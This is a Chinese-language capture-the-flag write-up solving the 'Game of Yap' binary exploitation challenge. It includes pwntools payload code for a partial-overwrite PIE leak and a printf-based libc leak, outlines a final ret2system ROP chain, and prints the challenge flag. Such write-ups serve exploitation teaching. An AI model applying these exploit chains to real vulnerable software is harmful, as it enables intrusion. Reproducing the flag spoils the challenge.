# Game of Yap

## 题目简述

64 位 PIE 程序启用 NX、未启用 canary。`play` 只有 256 字节栈缓冲区，却调用 `read(0, buffer, 0x256)`，返回地址偏移为 264。主流程最初给两次溢出机会；二进制还包含 `mov rdi, rsi; ret` gadget 和输出 `play` 地址的 `yap` 函数。

利用需要分三阶段：一字节部分覆盖泄露 PIE、短 ROP 泄露 libc 并回到 `play`、最后 ret2system。

## 解题过程

第一次溢出只改返回地址最低字节，使原本同一 PIE 映像内的返回地址跳到 `yap+8`。`yap` 输出 `play` 的运行时地址，据此计算 PIE 基址：

```python
payload = b"A" * 264 + bytes([(elf.sym["yap"] + 8) & 0xff])
send(payload)
elf.address = int(recvline(), 16) - elf.sym["play"]
```

第二次在缓冲区开头放 `%27$p`，再利用偏移 `0x1243` 的 `mov rdi, rsi; ret`。`read` 返回后 `rsi` 仍指向受控缓冲区，gadget 将其移入 `rdi`，调用 `printf` 就会把第 27 个栈参数作为地址输出。链末返回 `play+4`，获得第三次输入：

```python
payload = flat(
    b"%27$p".ljust(264, b"A"),
    elf.address + 0x1243,
    elf.plt["printf"],
    elf.sym["play"] + 4,
)
```

按题目所带 libc 的已知偏移把泄露换算为 libc 基址。最后构造标准 ROP：`pop rdi; ret`、`/bin/sh` 地址、`system` 地址；必要时插入单独 `ret` 保持续栈对齐。获得 shell 后读取：

```text
byuctf{heres_your_yap_plus_certification_c13abe01}
```

## 方法总结

- 核心技巧：用低字节覆盖在 PIE 内跳到泄露函数，再借残留寄存器 gadget 把栈缓冲区变成格式串，最终 ret2libc。
- 识别信号：输入次数有限但可返回到读取函数、PIE 内有显式泄露函数、寄存器仍保存缓冲区指针时，可把多个小原语串成分阶段利用。
- 复用要点：部分覆盖要求目标与原返回地址共享高字节；libc 偏移必须对应附件版本，最终调用前还要检查 x86-64 栈对齐。
